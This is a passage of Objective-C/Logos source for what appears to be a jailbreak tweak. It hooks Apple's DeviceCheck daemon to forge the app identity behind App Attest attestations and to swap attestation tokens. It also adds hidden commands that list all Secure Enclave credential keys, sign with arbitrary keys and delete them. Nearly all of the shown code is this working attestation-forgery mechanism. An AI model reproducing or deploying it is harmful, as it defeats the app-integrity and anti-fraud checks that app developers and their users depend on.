// alone, and no separate existence check is worth adding on top of it.
static void OracledHandleDeleteArbitraryKey(NSString *label, id completion) {
    void (^block)(id, id) = completion;

    OracledDeleteCredentialKeychainWithLabelFn deleteFn =
        (OracledDeleteCredentialKeychainWithLabelFn)AAI_LIVE(AAI_STATIC_deleteCredentialKeychainWithLabel);
    int ok = deleteFn(label);
    NSLog(@"[OracledDCPatch] delete label=%@ -> %d", label, ok);

    if (!ok) {
        NSError *err = [NSError errorWithDomain:@"xyz.regulad.oracled.se"
                                            code:-1
                                        userInfo:@{NSLocalizedDescriptionKey: @"deleteCredentialKeychainWithLabel returned false"}];
        block(nil, err);
        return;
    }
    NSError *jsonErr = nil;
    NSData *json = [NSJSONSerialization dataWithJSONObject:@{@"deleted": @YES}
                                                     options:0 error:&jsonErr];
    block(json, jsonErr);
}

%hook DCClientHandler

// Ground truth identity derivation — the actual forgery target (arg1 of
// the appAttestation* selectors below is NOT identity-bearing, see header).
- (id)_generateAppIDFromCurrentConnection {
    NSString *forced = OracledForcedAppID();
    return forced ?: %orig;
}

- (BOOL)_isSupported {
    if (OracledForcedAppID()) return YES;
    return %orig;
}

- (void)appAttestationCreateKey:(id)context completion:(id)completion {
    OracledDumpContext(context, OracledForcedAppID() ? "createKey INCOMING (forcing)" : "createKey INCOMING (real)");
    id used = OracledForceToken(context);
    if (OracledForcedAppID()) OracledDumpContext(used, "createKey FORCED (outgoing)");
    %orig(used, completion);
}

- (void)appAttestationAttestKey:(id)context keyId:(id)keyId clientDataHash:(id)hash completion:(id)completion {
    OracledDumpContext(context, OracledForcedAppID() ? "attestKey INCOMING (forcing)" : "attestKey INCOMING (real)");
    id used = OracledForceToken(context);
    if (OracledForcedAppID()) OracledDumpContext(used, "attestKey FORCED (outgoing)");
    %orig(used, keyId, hash, completion);
}

- (void)appAttestationAssert:(id)context keyId:(id)keyId clientDataHash:(id)hash completion:(id)completion {
    if ([keyId isKindOfClass:[NSString class]]) {
        if ([keyId isEqualToString:kOracledListSEKeysSentinel]) {
            NSLog(@"[OracledDCPatch] intercepted Assert: listing all SE-resident credential keys");
            OracledHandleListSEKeys(completion);
            return;
        }
        if ([(NSString *)keyId hasPrefix:kOracledRawLabelSignPrefix]) {
            NSString *label = [(NSString *)keyId substringFromIndex:kOracledRawLabelSignPrefix.length];
            NSLog(@"[OracledDCPatch] intercepted Assert: signing with arbitrary raw label=%@", label);
            OracledHandleSignArbitraryKey(label, hash, completion);
            return;
        }
        if ([(NSString *)keyId hasPrefix:kOracledRawLabelDeletePrefix]) {
            NSString *label = [(NSString *)keyId substringFromIndex:kOracledRawLabelDeletePrefix.length];
            NSLog(@"[OracledDCPatch] intercepted Assert: deleting arbitrary raw label=%@", label);
            OracledHandleDeleteArbitraryKey(label, completion);
            return;
        }
    }
    OracledDumpContext(context, OracledForcedAppID() ? "assert INCOMING (forcing)" : "assert INCOMING (real)");
    id used = OracledForceToken(context);
    if (OracledForcedAppID()) OracledDumpContext(used, "assert FORCED (outgoing)");
    %orig(used, keyId, hash, completion);
}

%end

%ctor {
    void *h = dlopen("/usr/lib/libsandy.dylib", RTLD_NOW);
    gSandyResult = h ? libSandy_applyProfile("OracledDCPatch") : -1;
    NSLog(@"[OracledDCPatch] loaded into %@, dlopen=%p, libSandy_applyProfile = %d",
          NSProcessInfo.processInfo.processName, h, gSandyResult);
}
